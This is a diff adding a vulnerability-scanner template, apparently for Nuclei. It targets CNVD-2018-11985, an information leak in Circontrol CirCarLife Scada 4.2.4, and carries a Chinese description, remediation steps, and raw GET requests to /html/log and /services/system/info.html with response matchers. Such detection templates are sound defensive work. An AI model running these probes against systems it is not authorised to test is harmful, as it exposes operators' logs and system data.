@@ -1,0 +1,47 @@
+id: CNVD-2018-11985
+info:
+  name: circarlife scada info.html和log信息泄露
+  author:
+  - jim2g
+  description: "circarlife scada info.html和log信息泄露\nCircontrol CirCarLife Scada是西班牙Circontrol公司的一套停车场自动化管理系统。\n\nCircontrol
+    CirCarLife Scada 4.2.4版本中存在安全漏洞。远程攻击者可通过对html/log或services/system/info.html URI发送直接请求利用该漏洞获取敏感信息。 "
+  severity: medium
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://circontrol.com/intelligent-charging-solutions/
+    临时修复方案：
+    1、去除页面、cookie或缓存中涉及的敏感信息或删除泄露信息页面
+    2、将敏感信息进行加密存储，非必要不可发送前端
+    3、发送敏感信息时需加密传输，如有必要需脱敏处理
+    4、禁止用自己开发的加密算法，必须使用公开、安全的标准加密算法。
+    5、禁止在日志中记录明文的敏感数据：禁止在日志中记录明文的敏感数据（如口
+    令、会话标识jsessionid等）， 防止敏感信息泄漏。
+    6、禁止带有敏感数据的Web页面缓存：带有敏感数据的Web页面都应该禁止缓
+    存，以防止敏感信息泄漏或通过代理服务器上网的用户数据互窜问题。
+    7、对必须发送的敏感数据或页面请求接口做好严格的权限认证
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body_1,"user.info")
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body_1,"user.debug")
+  - type: dsl
+    condition: or
+    dsl:
+    - status_code==200
+    - contains(body_2,"CirCarLife")
+  raw:
+  - |
+    GET /html/log HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /services/system/info.html HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
